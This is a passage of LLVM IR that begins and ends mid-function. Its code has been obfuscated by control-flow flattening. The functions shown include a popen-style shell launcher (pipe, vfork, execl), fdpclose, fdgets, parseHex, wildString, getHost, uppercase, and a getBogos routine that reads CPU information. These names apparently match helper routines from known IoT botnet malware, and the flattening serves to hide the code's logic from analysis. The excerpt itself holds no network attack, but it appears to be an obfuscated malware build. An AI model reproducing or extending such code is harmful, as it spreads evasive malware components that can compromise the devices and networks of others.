  %82 = icmp ne i32 %81, 1
  %83 = select i1 %82, i32 -705124330, i32 -1185788217
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %86 = load i32, i32* %85, align 4
  %87 = call i32 @dup2(i32 %86, i32 1) #2
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @close(i32 %89)
  store i32 -1185788217, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %93 = load i32, i32* %92, align 4
  %94 = call i32 @close(i32 %93)
  store i32 1994275162, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  %96 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %97 = load i32, i32* %96, align 4
  %98 = icmp ne i32 %97, 0
  %99 = select i1 %98, i32 -1767667022, i32 521537705
  store i32 %99, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  %101 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %102 = load i32, i32* %101, align 4
  %103 = call i32 @dup2(i32 %102, i32 0) #2
  %104 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %105 = load i32, i32* %104, align 4
  %106 = call i32 @close(i32 %105)
  store i32 521537705, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  %108 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %109 = load i32, i32* %108, align 4
  %110 = call i32 @close(i32 %109)
  store i32 1994275162, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i8*, i8** %4, align 8
  %113 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.41, i32 0, i32 0), i8* %112, i8* null) #2
  call void @_exit(i32 127) #12
  unreachable

NewDefault:                                       ; preds = %loopEntry
  store i32 -800265587, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i8*, i8** %5, align 8
  %116 = load i8, i8* %115, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp eq i32 %117, 114
  %119 = select i1 %118, i32 -1313857078, i32 -80207351
  store i32 %119, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %122 = load i32, i32* %121, align 4
  store i32 %122, i32* %6, align 4
  %123 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %124 = load i32, i32* %123, align 4
  %125 = call i32 @close(i32 %124)
  store i32 680110913, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %128 = load i32, i32* %127, align 4
  store i32 %128, i32* %6, align 4
  %129 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %130 = load i32, i32* %129, align 4
  %131 = call i32 @close(i32 %130)
  store i32 680110913, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  %133 = load i32, i32* %9, align 4
  %134 = load i32*, i32** @fdopen_pids, align 8
  %135 = load i32, i32* %6, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds i32, i32* %134, i64 %136
  store i32 %133, i32* %137, align 4
  %138 = load i32, i32* %6, align 4
  store i32 %138, i32* %3, align 4
  store i32 -772679943, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = load i32, i32* %3, align 4
  ret i32 %140

loopEnd:                                          ; preds = %132, %126, %120, %114, %NewDefault, %107, %100, %95, %91, %84, %79, %73, %66, %LeafBlock, %LeafBlock1, %NodeBlock, %61, %55, %54, %44, %43, %39, %35, %34, %29, %28, %21, %15, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %.reg2mem = alloca i32*
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  store i32* %10, i32** %.reg2mem
  %switchVar = alloca i32
  store i32 -790368874, i32* %switchVar
  %.reg2mem2 = alloca i1
  %.reg2mem4 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -790368874, label %first
    i32 251303399, label %13
    i32 -1811634728, label %21
    i32 440436753, label %22
    i32 -73460131, label %30
    i32 -706912593, label %37
    i32 -450649642, label %41
    i32 1792651019, label %45
    i32 -1984402199, label %47
    i32 252229351, label %56
    i32 1606238772, label %57
    i32 -284557867, label %64
    i32 -1022606810, label %65
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32*, i32** %.reg2mem
  %11 = icmp eq i32* %.reload, null
  %12 = select i1 %11, i32 -1811634728, i32 251303399
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32*, i32** @fdopen_pids, align 8
  %15 = load i32, i32* %3, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds i32, i32* %14, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = icmp eq i32 %18, 0
  %20 = select i1 %19, i32 -1811634728, i32 440436753
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  store i32 -1, i32* %2, align 4
  store i32 -1022606810, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i32, i32* %3, align 4
  %24 = call i32 @close(i32 %23)
  %25 = call i32 @sigemptyset(%struct.__sigset_t* %6) #2
  %26 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #2
  %27 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #2
  %28 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #2
  %29 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #2
  store i32 -73460131, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32*, i32** @fdopen_pids, align 8
  %32 = load i32, i32* %3, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i32, i32* %31, i64 %33
  %35 = load i32, i32* %34, align 4
  %36 = call i32 @waitpid(i32 %35, i32* %7, i32 0)
  store i32 %36, i32* %8, align 4
  store i32 -706912593, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %8, align 4
  %39 = icmp eq i32 %38, -1
  %40 = select i1 %39, i32 -450649642, i32 1792651019
  store i32 %40, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = call i32* @__errno_location() #13
  %43 = load i32, i32* %42, align 4
  %44 = icmp eq i32 %43, 4
  store i32 1792651019, i32* %switchVar
  store i1 %44, i1* %.reg2mem2
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %46 = select i1 %.reload3, i32 -73460131, i32 -1984402199
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = load i32, i32* %4, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds i32, i32* %49, i64 %51
  store i32 0, i32* %52, align 4
  %53 = load i32, i32* %8, align 4
  %54 = icmp eq i32 %53, -1
  %55 = select i1 %54, i32 252229351, i32 1606238772
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  store i32 -284557867, i32* %switchVar
  store i32 -1, i32* %.reg2mem4
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = bitcast %struct.in_addr* %9 to i32*
  %59 = load i32, i32* %7, align 4
  store i32 %59, i32* %58, align 4
  %60 = bitcast %struct.in_addr* %9 to i32*
  %61 = load i32, i32* %60, align 4
  %62 = and i32 %61, 65280
  %63 = ashr i32 %62, 8
  store i32 -284557867, i32* %switchVar
  store i32 %63, i32* %.reg2mem4
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %.reload5 = load i32, i32* %.reg2mem4
  store i32 %.reload5, i32* %2, align 4
  store i32 -1022606810, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %2, align 4
  ret i32 %66

loopEnd:                                          ; preds = %64, %57, %56, %47, %45, %41, %37, %30, %22, %21, %13, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  %switchVar = alloca i32
  store i32 1506924686, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i8*
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1506924686, label %9
    i32 -2010657508, label %13
    i32 -354062325, label %18
    i32 -1350723223, label %27
    i32 830328019, label %29
    i32 -1062360014, label %39
    i32 1145406838, label %43
    i32 -357738086, label %44
    i32 1607148160, label %46
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  %12 = select i1 %11, i32 -2010657508, i32 -1350723223
  store i32 %12, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32, i32* %8, align 4
  %15 = load i32, i32* %5, align 4
  %16 = icmp slt i32 %14, %15
  %17 = select i1 %16, i32 -354062325, i32 -1350723223
  store i32 %17, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = load i32, i32* %8, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  %23 = getelementptr inbounds i8, i8* %22, i64 -1
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp ne i32 %25, 10
  store i32 -1350723223, i32* %switchVar
  store i1 %26, i1* %.reg2mem
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %28 = select i1 %.reload, i32 830328019, i32 -1062360014
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %6, align 4
  %31 = load i8*, i8** %4, align 8
  %32 = load i32, i32* %8, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %31, i64 %33
  %35 = call i64 @read(i32 %30, i8* %34, i64 1)
  %36 = trunc i64 %35 to i32
  store i32 %36, i32* %7, align 4
  %37 = load i32, i32* %8, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %8, align 4
  store i32 1506924686, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %7, align 4
  %41 = icmp eq i32 %40, 0
  %42 = select i1 %41, i32 1145406838, i32 -357738086
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 1607148160, i32* %switchVar
  store i8* null, i8** %.reg2mem2
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i8*, i8** %4, align 8
  store i32 1607148160, i32* %switchVar
  store i8* %45, i8** %.reg2mem2
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %.reload3 = load i8*, i8** %.reg2mem2
  ret i8* %.reload3

loopEnd:                                          ; preds = %44, %43, %39, %29, %27, %18, %13, %9, %switchDefault
  br label %loopEntry
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  %switchVar = alloca i32
  store i32 -1324633550, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1324633550, label %4
    i32 -1167866477, label %10
    i32 -1651290828, label %13
    i32 -795809929, label %15
    i32 1055992692, label %25
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:4:                                      ; preds = %loopEntry
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  %9 = select i1 %8, i32 -1167866477, i32 -1651290828
  store i32 %9, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i64, i64* %3, align 8
  %12 = icmp sge i64 %11, 0
  store i32 -1651290828, i32* %switchVar
  store i1 %12, i1* %.reg2mem
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %14 = select i1 %.reload, i32 -795809929, i32 1055992692
  store i32 %14, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i64, i64* %3, align 8
  %17 = shl i64 %16, 4
  %18 = load i8*, i8** %2, align 8
  %19 = getelementptr inbounds i8, i8* %18, i32 1
  store i8* %19, i8** %2, align 8
  %20 = load i8, i8* %18, align 1
  %21 = zext i8 %20 to i64
  %22 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %21
  %23 = load i64, i64* %22, align 8
  %24 = or i64 %17, %23
  store i64 %24, i64* %3, align 8
  store i32 -1324633550, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i64, i64* %3, align 8
  ret i64 %26

loopEnd:                                          ; preds = %15, %13, %10, %4, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  store i32 %8, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1832530150, i32* %switchVar
  %.reg2mem12 = alloca i1
  %.reg2mem14 = alloca i1
  %.reg2mem16 = alloca i1
  %.reg2mem18 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar7 = load i32, i32* %switchVar
  switch i32 %switchVar7, label %switchDefault [
    i32 -1832530150, label %NodeBlock5
    i32 2130009619, label %NodeBlock
    i32 -47111959, label %LeafBlock3
    i32 -659000020, label %LeafBlock1
    i32 1988377167, label %LeafBlock
    i32 954197834, label %14
    i32 -665669092, label %18
    i32 -227264981, label %25
    i32 -1319995357, label %31
    i32 2110696178, label %38
    i32 208806430, label %39
    i32 -2138757137, label %42
    i32 228288717, label %48
    i32 2109222525, label %56
    i32 316376616, label %NewDefault
    i32 1264642358, label %59
    i32 2139545540, label %70
    i32 1763442479, label %78
    i32 62159315, label %81
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload11 = load volatile i32, i32* %.reg2mem
  %Pivot6 = icmp slt i32 %.reload11, 42
  %9 = select i1 %Pivot6, i32 1988377167, i32 2130009619
  store i32 %9, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload9 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload9, 63
  %10 = select i1 %Pivot, i32 -659000020, i32 -47111959
  store i32 %10, i32* %switchVar
  br label %loopEnd

LeafBlock3:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf4 = icmp eq i32 %.reload, 63
  %11 = select i1 %SwitchLeaf4, i32 -2138757137, i32 316376616
  store i32 %11, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload8 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf2 = icmp eq i32 %.reload8, 42
  %12 = select i1 %SwitchLeaf2, i32 -665669092, i32 316376616
  store i32 %12, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload10 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf = icmp eq i32 %.reload10, 0
  %13 = select i1 %SwitchLeaf, i32 954197834, i32 316376616
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  store i32 %17, i32* %3, align 4
  store i32 62159315, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = getelementptr inbounds i8, i8* %19, i64 1
  %21 = load i8*, i8** %5, align 8
  %22 = call i32 @wildString(i8* %20, i8* %21)
  %23 = icmp ne i32 %22, 0
  %24 = select i1 %23, i32 -227264981, i32 208806430
  store i32 %24, i32* %switchVar
  store i1 true, i1* %.reg2mem14
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i8*, i8** %5, align 8
  %27 = load i8, i8* %26, align 1
  %28 = zext i8 %27 to i32
  %29 = icmp ne i32 %28, 0
  %30 = select i1 %29, i32 -1319995357, i32 2110696178
  store i32 %30, i32* %switchVar
  store i1 false, i1* %.reg2mem12
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i8*, i8** %4, align 8
  %33 = load i8*, i8** %5, align 8
  %34 = getelementptr inbounds i8, i8* %33, i64 1
  %35 = call i32 @wildString(i8* %32, i8* %34)
  %36 = icmp ne i32 %35, 0
  %37 = xor i1 %36, true
  store i32 2110696178, i32* %switchVar
  store i1 %37, i1* %.reg2mem12
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %.reload13 = load i1, i1* %.reg2mem12
  store i32 208806430, i32* %switchVar
  store i1 %.reload13, i1* %.reg2mem14
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %.reload15 = load i1, i1* %.reg2mem14
  %40 = xor i1 %.reload15, true
  %41 = zext i1 %40 to i32
  store i32 %41, i32* %3, align 4
  store i32 62159315, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8*, i8** %5, align 8
  %44 = load i8, i8* %43, align 1
  %45 = zext i8 %44 to i32
  %46 = icmp ne i32 %45, 0
  %47 = select i1 %46, i32 228288717, i32 2109222525
  store i32 %47, i32* %switchVar
  store i1 false, i1* %.reg2mem16
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i8*, i8** %4, align 8
  %50 = getelementptr inbounds i8, i8* %49, i64 1
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i64 1
  %53 = call i32 @wildString(i8* %50, i8* %52)
  %54 = icmp ne i32 %53, 0
  %55 = xor i1 %54, true
  store i32 2109222525, i32* %switchVar
  store i1 %55, i1* %.reg2mem16
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %.reload17 = load i1, i1* %.reg2mem16
  %57 = xor i1 %.reload17, true
  %58 = zext i1 %57 to i32
  store i32 %58, i32* %3, align 4
  store i32 62159315, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 1264642358, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i8*, i8** %4, align 8
  %61 = load i8, i8* %60, align 1
  %62 = zext i8 %61 to i32
  %63 = call i32 @toupper(i32 %62) #10
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = call i32 @toupper(i32 %66) #10
  %68 = icmp eq i32 %63, %67
  %69 = select i1 %68, i32 2139545540, i32 1763442479
  store i32 %69, i32* %switchVar
  store i1 false, i1* %.reg2mem18
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = load i8*, i8** %4, align 8
  %72 = getelementptr inbounds i8, i8* %71, i64 1
  %73 = load i8*, i8** %5, align 8
  %74 = getelementptr inbounds i8, i8* %73, i64 1
  %75 = call i32 @wildString(i8* %72, i8* %74)
  %76 = icmp ne i32 %75, 0
  %77 = xor i1 %76, true
  store i32 1763442479, i32* %switchVar
  store i1 %77, i1* %.reg2mem18
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %.reload19 = load i1, i1* %.reg2mem18
  %79 = xor i1 %.reload19, true
  %80 = zext i1 %79 to i32
  store i32 %80, i32* %3, align 4
  store i32 62159315, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i32, i32* %3, align 4
  ret i32 %82

loopEnd:                                          ; preds = %78, %70, %59, %NewDefault, %56, %48, %42, %39, %38, %31, %25, %18, %14, %LeafBlock, %LeafBlock1, %LeafBlock3, %NodeBlock, %NodeBlock5, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #2
  store i32 %8, i32* %.reg2mem
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 1691812403, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1691812403, label %first
    i32 -353087116, label %13
    i32 -2140807024, label %14
    i32 28952655, label %15
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %11 = icmp eq i32 %.reload, -1
  %12 = select i1 %11, i32 -353087116, i32 -2140807024
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  store i32 1, i32* %3, align 4
  store i32 28952655, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 28952655, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i32, i32* %3, align 4
  ret i32 %16

loopEnd:                                          ; preds = %14, %13, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %switchVar = alloca i32
  store i32 -1004679721, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1004679721, label %3
    i32 -739906872, label %8
    i32 911382875, label %17
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:3:                                      ; preds = %loopEntry
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  %7 = select i1 %6, i32 -739906872, i32 911382875
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i8*, i8** %2, align 8
  %10 = load i8, i8* %9, align 1
  %11 = zext i8 %10 to i32
  %12 = call i32 @toupper(i32 %11) #10
  %13 = trunc i32 %12 to i8
  %14 = load i8*, i8** %2, align 8
  store i8 %13, i8* %14, align 1
  %15 = load i8*, i8** %2, align 8
  %16 = getelementptr inbounds i8, i8* %15, i32 1
  store i8* %16, i8** %2, align 8
  store i32 -1004679721, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %8, %3, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %7 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.42, i32 0, i32 0), i32 0)
  store i32 %7, i32* %4, align 4
  %switchVar = alloca i32
  store i32 -1860605244, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1860605244, label %8
    i32 -1844874143, label %14
    i32 -2115092583, label %21
    i32 1723569659, label %24
    i32 1715702515, label %30
    i32 -898323089, label %36
    i32 2067740059, label %41
    i32 -230211466, label %43
    i32 -67702161, label %46
    i32 -1285935710, label %47
    i32 1970873847, label %57
    i32 1622228856, label %66
    i32 732825278, label %68
    i32 1271086813, label %74
    i32 -1371835440, label %79
    i32 1781144268, label %82
    i32 -742202793, label %88
    i32 -1269315576, label %90
    i32 1707074726, label %93
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %10 = load i32, i32* %4, align 4
  %11 = call i8* @fdgets(i8* %9, i32 4096, i32 %10)
  %12 = icmp ne i8* %11, null
  %13 = select i1 %12, i32 -1844874143, i32 -1269315576
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @uppercase(i8* %15)
  %16 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %17 = call i8* @strstr(i8* %16, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i32 0, i32 0)) #10
  %18 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %19 = icmp eq i8* %17, %18
  %20 = select i1 %19, i32 -2115092583, i32 -742202793
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %23 = getelementptr inbounds i8, i8* %22, i64 8
  store i8* %23, i8** %6, align 8
  store i32 1723569659, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %6, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 32
  %29 = select i1 %28, i32 2067740059, i32 1715702515
  store i32 %29, i32* %switchVar
  store i1 true, i1* %.reg2mem
